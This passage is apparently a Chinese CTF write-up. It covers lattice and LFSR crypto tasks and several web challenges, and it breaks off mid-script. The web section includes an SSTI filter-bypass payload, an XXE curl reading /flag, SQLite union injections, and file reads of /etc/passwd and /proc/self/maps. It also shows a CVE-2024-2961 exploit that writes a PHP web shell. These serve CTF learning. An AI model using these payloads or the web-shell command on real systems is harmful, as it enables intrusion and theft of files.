class="string">m的值即为flag</span></span><br><span class="line"><span class="string">0.002127416739298073705574696200593072466561264659902471755875472082922378713642526659977748539883974700909790177123989603377522367935117269828845667662846262538383970611125421928502514023071134249606638896732927126986577684281168953404180429353050907281796771238578083386883803332963268109308622153680934466412</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这题让我想起了<a href="https://hvang10.github.io/2024/11/05/SHCTF2024-WriteUp/">SHCTF2024-week3-大学×高中√</a><br />形式稍微不一样，根据三角函数的倍角公式处理一下，得到题目给的值是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mi>s</mi><mi>i</mi><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">4sin^{3}(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">4</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span></p><p>因为我们不知道<code>flag</code>的长度，所以格最后一列的大系数得测试一下(拿<code>SH</code>那题测)，发现大概是<code>flag</code>位数的<strong>两倍</strong>这样就能出</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">leak = <span class="number">0.002127416739298073705574696200593072466561264659902471755875472082922378713642526659977748539883974700909790177123989603377522367935117269828845667662846262538383970611125421928502514023071134249606638896732927126986577684281168953404180429353050907281796771238578083386883803332963268109308622153680934466412</span></span><br><span class="line">leak = (leak / <span class="number">4</span>)^(<span class="number">1</span>/<span class="number">3</span>)</span><br><span class="line">asin = arcsin(leak)</span><br><span class="line">RF = RealField(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># RealField可以指定精度，RF默认53位</span></span><br><span class="line">pi = RF(pi)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    k = i*<span class="number">8</span></span><br><span class="line">    k0 = k*<span class="number">2</span></span><br><span class="line">    M = Matrix(QQ,[[<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>^k0],[<span class="number">0</span>,<span class="number">2</span>^k,<span class="number">2</span>^k0*asin],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^k0*<span class="number">2</span>*pi]])</span><br><span class="line">    m = <span class="built_in">abs</span>(M.LLL()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">    flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;NSSCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(flag.decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="river"><a class="markdownIt-Anchor" href="#river"></a> river()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, seed, mask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">踩踩背</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n, seed, mask, lfsr=<span class="literal">None</span></span>):</span><br><span class="line">        self.state = [<span class="built_in">int</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">f&quot;<span class="subst">&#123;seed:<span class="number">0</span>&#123;n&#125;</span>b&#125;&quot;</span>]</span><br><span class="line">        self.mask_bits = [<span class="built_in">int</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">f&quot;<span class="subst">&#123;mask:<span class="number">0</span>&#123;n&#125;</span>b&#125;&quot;</span>]</span><br><span class="line">        self.n = n</span><br><span class="line">        self.lfsr = lfsr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="built_in">sum</span>([self.state[i] * self.mask_bits[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n)]) &amp; <span class="number">1</span></span><br><span class="line">        self.state = self.state[<span class="number">1</span>:] + [s]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.lfsr:</span><br><span class="line">            <span class="keyword">if</span> self.lfsr():</span><br><span class="line">                self.update()</span><br><span class="line">            <span class="keyword">return</span> self.state[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.update()</span><br><span class="line">            <span class="keyword">return</span> self.state[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">奶龙</span>(<span class="title class_ inherited__">踩踩背</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n, seed, mask</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(n, seed, mask, lfsr=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">64</span></span><br><span class="line"><span class="keyword">assert</span> seed.bit_length == mask.bit_length == n</span><br><span class="line">lfsr1 = 奶龙(n, seed, mask)</span><br><span class="line">lfsr2 = 踩踩背(n, seed, mask, lfsr1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mask = <span class="subst">&#123;mask&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;output = <span class="subst">&#123;<span class="built_in">sum</span>(lfsr2() &lt;&lt; (n - <span class="number">1</span> - i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n))&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;AES.new(key=md5(<span class="built_in">str</span>(seed).encode()).digest(), mode=AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>))&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># mask = 9494051593829874780</span></span><br><span class="line"><span class="comment"># output = 13799267741689921474</span></span><br><span class="line"><span class="comment"># enc = b&#x27;\x03\xd1#\xb9\xaa5\xff3y\xba\xcb\x91`\x9d4p~9r\xf6i\r\xca\x03dW\xdb\x9a\xd2\xa6\xc6\x85\xfa\x19=b\xb2)5&gt;]\x05,\xeb\xa0\x12\xa9\x1e&#x27; </span></span><br></pre></td></tr></table></figure><p>这题就没仔细研究，不好打，当时看着三解，最后五解，就摆了</p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p><strong>还是Csome那句话，在这CINTA是基础，Sagemath是工具，糖醋小鸡块的blog是弹药库(狗头)</strong></p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="uploadssti"><a class="markdownIt-Anchor" href="#uploadssti"></a> upload?SSTI!</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify,render_template_string,send_from_directory, abort,redirect</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置信息</span></span><br><span class="line">UPLOAD_FOLDER = <span class="string">&#x27;static/uploads&#x27;</span>  <span class="comment"># 上传文件保存目录</span></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;text&#x27;</span>,<span class="string">&#x27;md&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line">MAX_CONTENT_LENGTH = <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 限制上传大小为 16MB</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = MAX_CONTENT_LENGTH</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建上传目录（如果不存在）</span></span><br><span class="line">os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_path</span>(<span class="params">basedir, path</span>):</span><br><span class="line">    <span class="keyword">return</span> os.path.commonpath([basedir,path])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_dangerous_keywords</span>(<span class="params">file_path</span>):</span><br><span class="line">    dangerous_keywords = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_content = <span class="built_in">str</span>(f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> keyword <span class="keyword">in</span> dangerous_keywords:</span><br><span class="line">            <span class="keyword">if</span> keyword <span class="keyword">in</span> file_content:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 找到危险关键字，返回 True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 文件内容中没有危险关键字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># 检查是否有文件被上传</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;未上传文件&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否选择了文件</span></span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;请选择文件&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证文件名和扩展名</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            <span class="comment"># 安全处理文件名</span></span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="comment"># 保存文件</span></span><br><span class="line">            save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">            file.save(save_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 返回文件路径（绝对路径）</span></span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">                <span class="string">&quot;message&quot;</span>: <span class="string">&quot;File uploaded successfully&quot;</span>,</span><br><span class="line">                <span class="string">&quot;path&quot;</span>: os.path.abspath(save_path)</span><br><span class="line">            &#125;), <span class="number">200</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;文件类型错误&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># GET 请求显示上传表单（可选）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Upload File&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Upload File&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=post enctype=multipart/form-data&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=file name=file&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=submit value=Upload&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 1. 过滤文件名</span></span><br><span class="line">        safe_filename = secure_filename(filename)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> safe_filename:</span><br><span class="line">            abort(<span class="number">400</span>, description=<span class="string">&quot;无效文件名&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 构造完整路径</span></span><br><span class="line">        file_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], safe_filename)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 路径安全检查</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_safe_path(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path):</span><br><span class="line">            abort(<span class="number">403</span>, description=<span class="string">&quot;禁止访问的路径&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4. 检查文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">            abort(<span class="number">404</span>, description=<span class="string">&quot;文件不存在&quot;</span>)</span><br><span class="line"></span><br><span class="line">        suffix=os.path.splitext(filename)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(suffix)</span><br><span class="line">        <span class="keyword">if</span> suffix==<span class="string">&quot;.jpg&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.png&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.gif&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> send_from_directory(<span class="string">&quot;static/uploads/&quot;</span>,filename,mimetype=<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> contains_dangerous_keywords(file_path):</span><br><span class="line">            <span class="comment"># 删除不安全的文件</span></span><br><span class="line">            os.remove(file_path)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Waf!!!!&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            file_data = f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        tmp_str = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;查看文件内容&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;文件内容：&#123;name&#125;&lt;/h1&gt;  &lt;!-- 显示文件名 --&gt;</span></span><br><span class="line"><span class="string">            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!-- 显示文件内容 --&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;footer&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&amp;copy; 2025 文件查看器&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/footer&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(name=safe_filename, data=file_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template_string(tmp_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        app.logger.error(<span class="string">f&quot;文件查看失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        abort(<span class="number">500</span>, description=<span class="string">&quot;文件查看失败:&#123;&#125; &quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(e)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误处理（可选）</span></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: error.description&#125;, <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">403</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forbidden</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: error.description&#125;, <span class="number">403</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p><strong>文件上传+SSTI</strong><br />注意因为这里会<code>return</code>，所以我们选择其他后缀<code>ALLOWED_EXTENSIONS = &#123;'txt', 'log', 'text','md','jpg','png','gif'&#125;</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> suffix==<span class="string">&quot;.jpg&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.png&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.gif&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> send_from_directory(<span class="string">&quot;static/uploads/&quot;</span>,filename,mimetype=<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后我们借助我们的老朋友<strong>fenjing</strong>跑一个<strong>payload</strong>出来</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload, config_payload</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(word <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">for</span> word <span class="keyword">in</span> blacklist)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    shell_payload, _ = exec_cmd_payload(waf, <span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">    <span class="comment"># config_payload = config_payload(waf)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># print(f&quot;&#123;config_payload=&#125;&quot;)</span></span><br></pre></td></tr></table></figure><p>然后就是抓包改一个文件名<code>xxx.md</code>，内容为上面的<code>payload</code>，之后<strong>访问<code>/file/xxx.md</code></strong></p><h2 id="_"><a class="markdownIt-Anchor" href="#_"></a> (&gt;﹏&lt;)</h2><p><strong>无过滤<code>xxe</code></strong><br /><code>curl -X POST http://node2.anna.nssctf.cn:28796/ghctf --data-urlencode 'xml=&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;'</code></p><h2 id="sql"><a class="markdownIt-Anchor" href="#sql"></a> SQL???</h2><p><code>id=1 order by 6</code>判断列数为5，然后习惯性查<code>database()</code>，没查到，原来是<strong>sqlite注入</strong>(题目算个提示)</p><p><code>id=1 union select 1,2,3,4,(select sql from sqlite_master)--</code>，查到表名和列名</p><p><code>id=1 union select 1,2,3,4,(select group_concat(flag) from flag)--</code>，查到数据</p><p><code>emmm</code>，据说<code>sqlmap</code>的话要开<code>--random-agent</code>，好防，我好像也没跑出来</p><h2 id="ez_readfile"><a class="markdownIt-Anchor" href="#ez_readfile"></a> ez_readfile</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>奇怪，网上找的字符串，强碰撞<code>yakit,bp</code>这些都发包不成功导致了读不到文件，然后下面是当时打<code>SHCTF2024</code><strong>fastcoll</strong>生成的文件</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg1.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg2.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    b = f.read()</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: a,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node2.anna.nssctf.cn:28002/?file=/etc/passwd&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>通过<code>file_get_contents</code>实现命令执行，可以参考这篇去年5月份就发的<a href="https://mp.weixin.qq.com/s/03Bq8iryo22Cme5QR0LqDw">cve-2024-2961</a>，然后是<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18296185">春秋杯夏季赛</a>，说实话不关注这些东西，真不好在网上慢慢找</p><p>这里用到的是<a href="https://github.com/kezibei/php-filter-iconv">kezibei的脚本</a><br />修改一下payload，<code>cmd = &quot;echo '&lt;?php system($_GET[\&quot;cmd\&quot;]); ?&gt;' &gt; /var/www/html/shell.php&quot;</code></p><p>这里我们需要有<code>maps</code>和<code>libc.so</code>(路径翻一下前者即可得到)文件(跟上面的脚本放在同一目录下即可)，前者直接下载复制保存即可，后者因为响应里面还有页面信息，而且内容较大，得保存到文件中，再删除掉文件前面的东西即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># maps</span></span><br><span class="line">url = <span class="string">&quot;http://node2.anna.nssctf.cn:28002/?file=/proc/self/maps&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc.so</span></span><br><span class="line">url = <span class="string">&quot;http://node2.anna.nssctf.cn:28002/?file=/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\CVE\\cve-2024-2961-LFI\\php-filter-iconv\\libc-2.31.so&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(res.content)</span><br></pre></td></tr></table></figure><p>然后在有<strong>pwn环境的主机</strong>中运行<code>php-filter-iconv.py</code>即可，我这里用的是<strong>wsl2+ubuntu22.04</strong>，把<code>payload</code>打入上面的<code>exp</code>，访问题目<strong>url/shell.php?cmd=cat /f</strong>*即可</p><p>看了官方<code>wp</code>，居然有非预期<br /><img src="https://pic1.zhimg.com/80/v2-4acc0d17eeae51da2f768b337c31295c_1440w.png" alt="" /><br />读取，<strong>/docker-entrypoint.sh</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check the environment variables for the flag and assign to INSERT_FLAG</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$DASFLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$DASFLAG</span>&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$GZCTF_FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$GZCTF_FLAG</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;flag&#123;TEST_Dynamic_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span 